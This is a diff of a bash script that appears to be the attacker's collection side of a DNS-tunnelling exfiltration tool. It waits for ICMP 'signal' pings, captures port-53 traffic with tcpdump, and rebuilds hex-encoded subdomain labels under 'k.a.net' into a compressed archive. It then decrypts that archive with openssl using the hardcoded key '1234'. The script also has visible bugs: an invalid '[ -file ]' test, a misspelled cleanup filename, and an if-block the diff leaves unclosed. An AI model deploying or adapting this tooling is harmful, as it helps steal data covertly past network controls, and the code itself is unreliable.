@@ -1,24 +1,54 @@
-# this listener will need to be running on DNS server to catch the dns queries
-# this data could also come from log files (/var/log/query.log...depending on how the dns
-# server is configured
+#!/bin/bash
 
-tcpdump -vvv -s 0 -l -n port 53 > xfil.tcpdump
+file="/root/xfil/ping.out"
 
-
-# This script will parse the tcpdump file and extract the data
-
-#!/bin/sh
-
-usage (){
-  echo "USAGE: xpand.sh <file>"
-  exit 1
+listen_for_signal()
+{
+  tcpdump -i eth0 'icmp[icmptype] = icmp-echo' -l |tee $file
 }
-if [ $1 ]; then	
-  egrep -o "[0-9a-f]*.k.a.net" $1 | cut -d. -f1 | grep -v ^\ | uniq >> $1.hex.out
-  xxd -r -p $1.hex.out > $1.gz
-  tar zxvf $1.gz -O > $1.xpand
-  openssl aes-256-cbc -d -in $1.xpand -out $1.final -k 1234
 
-else usage
-fi
+start_catch()
+{
+  pkill tcpdump ## kill the tcpdump for the command signal
+  tcpdump -vvv -s 0 -l -n port 53 > xfil.tcpdump
+}
 
+stop_catch()
+{
+  pkill tcpdump ## stop the catch
+  listen_for_signal  ## start a new command signal listenter
+}
+
+
+parse_signal()
+{
+  if [ -file ]; then
+    awk '/86|66|96/' $file > $file.awk
+    fsize=$(du -sb $file.awk | awk '{ print $1 }')
+    if [ $fsize != "0" ]; then
+     echo "Caught DNS xfil request"
+     echo "Initiating catch.sh..."
+     start_catch
+    fi
+
+   # cleanup
+   rm --interactive=never $file.awk
+  fi
+
+}
+
+cleanup()
+{
+  rm --interactive=never $file.akw
+}
+
+
+###MAIN
+#
+c=xfil.tcpdump
+
+if [ $c ]; then 
+  egrep -o "[0-9a-f]*.k.a.net" $c | cut -d. -f1 | grep -v ^\ | uniq >> $c.hex.out
+  xxd -r -p $c.hex.out > $c.gz
+  tar zxvf $c.gz -O > $c.xpand
+  openssl aes-256-cbc -d -in $c.xpand -out $c.final -k 1234
